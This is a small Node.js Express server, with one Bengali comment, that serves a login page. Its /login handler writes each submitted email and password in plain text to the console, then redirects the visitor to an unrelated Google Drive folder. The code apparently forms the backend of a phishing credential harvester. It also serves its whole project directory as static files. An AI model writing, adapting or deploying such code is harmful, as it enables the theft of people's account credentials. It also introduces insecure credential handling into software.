const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

// এই লাইনটি CSS লোড করার জন্য জরুরি
app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', (req, res) => {
    console.log("Email:", req.body.email);
    console.log("Password:", req.body.password);
   res.redirect('https://drive.google.com/drive/folders/1Zn0-14NNc6zjkJ3C0iv2P2xCcX0bpRfx?usp=drive_link');
});
app.listen(3000, () => {
    console.log("server running at http://localhost:3000");
});